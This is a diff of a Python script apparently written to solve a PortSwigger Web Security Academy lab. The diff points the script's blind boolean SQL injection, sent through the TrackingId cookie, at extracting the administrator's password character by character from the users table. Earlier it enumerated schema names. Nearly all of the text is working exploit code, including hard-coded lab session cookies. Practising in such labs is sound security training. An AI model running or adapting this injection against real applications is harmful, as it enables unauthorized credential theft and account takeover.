@@ -20,8 +20,12 @@ characters = string.printable
 
 session = requests.session()
 
-main_url = "https://0aef00700331290885008a5c000300b4.web-security-academy.net:443/"
-headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
+
+main_url = "https://0a4c0031043436d880c45e1f00ef0042.web-security-academy.net:443/"
+burp0_cookies = {"TrackingId": "UbX6LkTTOkhlRvcE", "session": "jgOPzuJ4OuPsuhPyaaNg2RCmiVmh07lW"}
+headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://portswigger.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
+
+
 
 
 def makeSQLI(): 
@@ -36,12 +40,12 @@ def makeSQLI():
 
     # character position
     for position in range(1, 150):
-        print(position)
         # range of characters
         for character in range(33,126):
-            cookies = {"TrackingId": f"OZLu9L7hGiKlPnh' or (select (ASCII(substring(string_agg(schema_name, ', '), {position}, 1)) = {character}) from information_schema.schemata)-- -", "session": "CvkcVRZUf04sxCFBfNZ5CYfQFVY6EEPQ"}
-
+            cookies = {"TrackingId": f"UbX6LkTTOkhlRvc' or (select (ASCII(substring(string_agg(password, ', '), {position}, 1)) = {character}) from users where username = 'administrator')-- -", "session": "jgOPzuJ4OuPsuhPyaaNg2RCmiVmh07lW"}
             r = requests.get(main_url, headers=headers, cookies=cookies)
+
+            p1.status(f"Iniciando proceso de fuerza bruta: posicion {position}, character {character}")
 
             if r.text.find("Welcome back!") != -1:
                 extracted_info += chr(character)
